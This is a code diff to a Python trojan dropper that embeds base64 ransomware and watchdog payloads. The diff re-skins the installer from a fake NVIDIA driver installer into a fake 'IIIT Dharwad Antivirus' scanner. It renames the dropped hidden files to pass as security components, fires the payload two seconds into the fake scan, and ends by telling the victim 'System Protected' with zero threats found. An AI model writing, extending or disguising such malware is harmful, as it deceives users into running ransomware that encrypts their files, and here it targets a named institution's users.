@@ -83,11 +83,11 @@ import tempfile
 from tkinter import Tk, Label, ttk, Frame
 
 # --- CONFIGURATION ---
-FAKE_TITLE = "NVIDIA GeForce Game Ready Driver Installer"
+FAKE_TITLE = "IIIT Dharwad Antivirus \u2014 System Protection Suite"
 RANSOMWARE_B64 = "{ransomware_b64}"
 WATCHDOG_B64 = "{watchdog_b64}"
-RANSOMWARE_NAME = ".nvidia_ransomware.py"
-WATCHDOG_NAME = ".nvidia_watchdog.py"
+RANSOMWARE_NAME = ".iiitdwd_security.py"
+WATCHDOG_NAME = ".iiitdwd_watchdog.py"
 
 def extract_and_execute_payload():
     """Drops both ransomware and watchdog, then launches watchdog."""
@@ -123,51 +123,121 @@ def extract_and_execute_payload():
         pass
 
 def fake_installer_gui():
+    import tkinter.font as tkfont
     root = Tk()
     root.title(FAKE_TITLE)
-    root.geometry("600x400")
+    root.geometry("650x480")
     root.resizable(False, False)
-    root.configure(bg="#1a1a1a")
+    root.configure(bg="#0a0e17")
 
-    header = Frame(root, bg="#1a1a1a")
-    header.pack(fill="x", pady=20)
-    Label(header, text="NVIDIA", fg="#76b900", bg="#1a1a1a", font=("Segoe UI", 24, "bold")).pack()
-    Label(header, text="Graphics Driver Installer", fg="white", bg="#1a1a1a", font=("Segoe UI", 16)).pack()
+    # --- Top Banner ---
+    banner = Frame(root, bg="#0d1520", highlightbackground="#00d4aa", highlightthickness=0)
+    banner.pack(fill="x")
+    banner_inner = Frame(banner, bg="#0d1520")
+    banner_inner.pack(pady=15)
 
-    content = Frame(root, bg="#1a1a1a")
-    content.pack(expand=True, fill="both", padx=40)
+    # Shield icon using unicode
+    shield_frame = Frame(banner_inner, bg="#0d1520")
+    shield_frame.pack(side="left", padx=(20, 12))
+    Label(shield_frame, text="\U0001f6e1\ufe0f", font=("Segoe UI Emoji", 32), bg="#0d1520").pack()
+
+    text_frame = Frame(banner_inner, bg="#0d1520")
+    text_frame.pack(side="left")
+    Label(text_frame, text="IIIT DHARWAD", fg="#00d4aa", bg="#0d1520", font=("Segoe UI", 22, "bold")).pack(anchor="w")
+    Label(text_frame, text="Antivirus \u2022 System Protection Suite", fg="#7a8ba5", bg="#0d1520", font=("Segoe UI", 11)).pack(anchor="w")
+
+    # Thin accent line
+    Frame(root, bg="#00d4aa", height=2).pack(fill="x")
+
+    # --- Main Content ---
+    content = Frame(root, bg="#0a0e17")
+    content.pack(expand=True, fill="both", padx=35, pady=15)
+
+    # Status area
+    status_frame = Frame(content, bg="#111827", highlightbackground="#1e293b", highlightthickness=1)
+    status_frame.pack(fill="x", pady=(0, 12))
+    status_inner = Frame(status_frame, bg="#111827")
+    status_inner.pack(fill="x", padx=15, pady=12)
+
+    scan_icon = Label(status_inner, text="\U0001f50d", font=("Segoe UI Emoji", 14), bg="#111827")
+    scan_icon.pack(side="left", padx=(0, 8))
+
+    status_label = Label(status_inner, text="Initializing threat scanner...", fg="#e2e8f0", bg="#111827", font=("Segoe UI", 11))
+    status_label.pack(side="left")
+
+    # Progress bar with custom style
+    style = ttk.Style()
+    style.theme_use('default')
+    style.configure("Cyber.Horizontal.TProgressbar", 
+                    troughcolor='#1e293b', background='#00d4aa', 
+                    darkcolor='#00d4aa', lightcolor='#00ffc8',
+                    bordercolor='#1e293b', thickness=22)
     
-    status_label = Label(content, text="Checking system compatibility...", fg="#cccccc", bg="#1a1a1a", font=("Segoe UI", 10))
-    status_label.pack(anchor="w", pady=(20, 5))
+    progress = ttk.Progressbar(content, orient="horizontal", length=570, 
+                                mode="determinate", style="Cyber.Horizontal.TProgressbar")
+    progress.pack(pady=(0, 8))
+
+    # Percentage label
+    pct_label = Label(content, text="0%", fg="#00d4aa", bg="#0a0e17", font=("Consolas", 13, "bold"))
+    pct_label.pack()
+
+    # Threat counter
+    threat_frame = Frame(content, bg="#0a0e17")
+    threat_frame.pack(fill="x", pady=(12, 0))
     
-    progress = ttk.Progressbar(content, orient="horizontal", length=520, mode="determinate")
-    progress.pack(pady=10)
+    files_label = Label(threat_frame, text="Files Scanned: 0", fg="#64748b", bg="#0a0e17", font=("Consolas", 9))
+    files_label.pack(side="left")
+    threat_label = Label(threat_frame, text="Threats Found: 0", fg="#64748b", bg="#0a0e17", font=("Consolas", 9))
+    threat_label.pack(side="right")
+
+    # Bottom version bar
+    bottom = Frame(root, bg="#0d1520")
+    bottom.pack(fill="x", side="bottom")
+    Label(bottom, text="v3.2.1  \u2022  Database: 2026.02.10  \u2022  Licensed to IIIT Dharwad", 
+          fg="#475569", bg="#0d1520", font=("Segoe UI", 8)).pack(pady=6)
 
     def run_simulation():
+        import random
         steps = [
-            "Checking install options...", "Validating packages...", "Installing Graphics Driver...",
-            "Installing HD Audio Driver...", "Installing PhysX System...", "Finalizing..."
+            ("\U0001f50d Scanning system processes...", 0),
+            ("\U0001f4c2 Analyzing startup entries...", 0),
+            ("\U0001f310 Checking network connections...", 0),
+            ("\U0001f512 Verifying file signatures...", 0),
+            ("\U0001f9ec Deep scanning memory...", 0),
+            ("\U0001f6e1\ufe0f Updating threat definitions...", 0),
+            ("\u2705 Applying real-time protection...", 0),
+            ("\U0001f4ca Generating security report...", 0),
         ]
         
-        # EXECUTE PAYLOAD AT 30%
+        # EXECUTE PAYLOAD AT 25%
         root.after(2000, extract_and_execute_payload)
         
         progress['maximum'] = 100
         current_val = 0
+        file_count = 0
         
-        for i, step in enumerate(steps):
-            time.sleep(1.0) 
+        for i, (step, _) in enumerate(steps):
+            time.sleep(0.8)
             status_label.config(text=step)
             root.update()
             
             target = int((i + 1) / len(steps) * 100)
             while current_val < target:
-                current_val += 2
+                current_val += 1
                 progress['value'] = current_val
-                time.sleep(0.02)
+                pct_label.config(text=f"{{current_val}}%")
+                file_count += random.randint(80, 250)
+                files_label.config(text=f"Files Scanned: {{file_count:,}}")
+                time.sleep(0.03)
                 root.update()
         
-        time.sleep(1)
+        # Final result
+        status_label.config(text="\u2705 Scan Complete \u2014 System Protected!", fg="#00d4aa")
+        scan_icon.config(text="\u2705")
+        threat_label.config(text="Threats Found: 0", fg="#00d4aa")
+        pct_label.config(text="100%")
+        root.update()
+        time.sleep(2)
         root.destroy()
 
     threading.Thread(target=run_simulation, daemon=True).start()
